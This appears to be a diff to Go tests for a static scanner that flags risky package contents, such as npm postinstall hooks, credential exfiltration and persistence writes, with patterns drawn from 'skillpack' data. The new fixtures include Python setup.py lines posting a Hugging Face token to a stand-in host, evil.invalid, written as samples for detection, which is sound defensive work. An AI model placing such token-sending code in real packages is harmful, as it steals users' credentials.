@@ -22,7 +22,7 @@ func TestStaticScannerFlagsNpmPostinstall(t *testing.T) {
 	}
 }
 
-func TestStaticScannerPromptsOnNpmDependencyMetadata(t *testing.T) {
+func TestStaticScannerDoesNotBlanketBlockNPMDependencyMetadata(t *testing.T) {
 	dir := t.TempDir()
 	body := []byte(`{"dependencies":{"left-pad":"1.3.0"}}`)
 	if err := os.WriteFile(filepath.Join(dir, "package.json"), body, 0o600); err != nil {
@@ -33,8 +33,8 @@ func TestStaticScannerPromptsOnNpmDependencyMetadata(t *testing.T) {
 	if err != nil {
 		t.Fatal(err)
 	}
-	if !hasFinding(findings, "dependency_metadata_present") {
-		t.Fatalf("expected dependency metadata finding, got %#v", findings)
+	if hasFinding(findings, "dependency_metadata_present") {
+		t.Fatalf("unexpected blanket dependency metadata finding, got %#v", findings)
 	}
 }
 
@@ -73,6 +73,24 @@ requests.post("https://evil.invalid", data=data)
 	}
 	if !hasFinding(findings, "credential_exfil_pattern") {
 		t.Fatalf("expected credential exfil finding, got %#v", findings)
+	}
+}
+
+func TestStaticScannerUsesEmbeddedSkillpackCredentialPattern(t *testing.T) {
+	dir := t.TempDir()
+	source := []byte(`import requests
+requests.post("https://evil.invalid", data="HUGGING_FACE_HUB_TOKEN")
+`)
+	if err := os.WriteFile(filepath.Join(dir, "setup.py"), source, 0o600); err != nil {
+		t.Fatal(err)
+	}
+
+	findings, err := StaticScan(dir)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if !hasFinding(findings, "credential_exfil_pattern") {
+		t.Fatalf("expected credential exfil finding from embedded skillpack data, got %#v", findings)
 	}
 }
 
@@ -140,6 +158,31 @@ func TestStaticScannerUsesSkillpackPersistencePatterns(t *testing.T) {
 	if firstFindingSeverity(findings, "persistence_write_pattern") != "block" {
 		t.Fatalf("expected blocking persistence_write_pattern from skillpack pattern, got %#v", findings)
 	}
+}
+
+func TestScanSourceUsesProvidedSkillpackConfigPatternData(t *testing.T) {
+	cfg := staticScannerConfig{
+		credentialPatterns: []string{"ONLY_FROM_SKILLPACK_DATA"},
+		networkPatterns:    []string{"send_it("},
+		findings: map[string]skillpackFinding{
+			"credential_exfil_pattern": {
+				Severity:      "block",
+				SourceMessage: "custom data-driven credential message",
+			},
+			"network_api": {
+				Severity: "prompt",
+				Message:  "custom data-driven network message",
+			},
+		},
+	}
+
+	findings := scanSourceWithConfig("payload.py", `send_it("ONLY_FROM_SKILLPACK_DATA")`, cfg)
+	for _, finding := range findings {
+		if finding.Code == "credential_exfil_pattern" && finding.Message == "custom data-driven credential message" {
+			return
+		}
+	}
+	t.Fatalf("expected credential finding from provided skillpack config, got %#v", findings)
 }
 
 func hasFinding(findings []Finding, code string) bool {
